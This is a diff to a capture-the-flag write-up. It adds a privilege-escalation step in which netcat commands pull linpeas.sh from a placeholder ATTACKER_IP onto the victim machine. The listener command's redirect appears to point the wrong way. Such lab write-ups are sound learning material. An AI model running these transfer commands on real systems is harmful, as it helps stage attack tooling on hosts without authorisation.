@@ -205,6 +205,18 @@ james13
 
 ###### Found 1st Flag (user.txt) --> Post Exploit Section
 
+# Privilege Escalation
+
+Attacker Machine
+```
+nc -lnvp PORT> linpeas.sh
+```
+
+James Machine
+```
+nc ATTACKER_IP PORT > linpeas.sh
+```
+
 Executed  "linpeas.sh"  in the victim(James) machine 
 found '/etc/hosts'  is out of root permissions
 
